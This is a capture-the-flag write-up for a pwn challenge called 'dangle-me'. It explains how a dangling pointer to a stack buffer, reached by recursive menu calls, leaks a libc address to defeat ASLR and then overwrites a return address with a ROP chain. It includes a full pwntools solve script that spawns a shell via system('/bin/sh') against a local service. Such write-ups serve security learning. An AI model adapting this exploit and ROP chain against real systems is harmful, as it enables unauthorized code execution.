# Write-up: dangle-me

## Category: pwn

## Author brzeks

Mostly a typical ret2libc. `main` calls a function that returns a pointer to its local stack buffer and the rest of the program operates on that buffer. At first the buffer is located high enough above the stack frame to not cause any bugs, however by using the second menu option "I want to ascend" we can recursively call the `menu` function, which means we can push an arbitrary amount of new stack frames and get the stack pointer close to the vulnerable buffer. At some point the buffer starts getting overwritten by library functions which enables us to leak a libc address, thus defeating ASLR. By carefully positioning the stack pointer we can use the buffer to overwrite a return address from a libc function and execute a ROP chain, thus solving the challenge.

solve script:

```py
from pwn import *
import re

context.arch = 'amd64'

libc = ELF("./libc.so.6")

r = remote('localhost', 30000)

for _ in range(346 + 20):
    r.sendlineafter(b'> ', b'2')

r.sendlineafter(b'> ', b'1')
libc_leak = packing.u64(re.search(rb"fals(.*?), dear", r.recvline_endswith(b'dear'), re.DOTALL)[1].ljust(8, b'\0'))
log.info(f"libc leak: {hex(libc_leak)}")

libc.address = libc_leak - libc.symbols['_IO_2_1_stdin_']
log.info(hex(libc.address))

for _ in range(89 - 20):
    r.sendlineafter(b'> ', b'2')

rop = ROP(libc)
rop.raw(rop.ret)
rop.call("system", [next(libc.search(b"/bin/sh\0"))])

r.sendline(b'4')
r.sendline(b'A' * 8 + rop.chain())

r.interactive()
```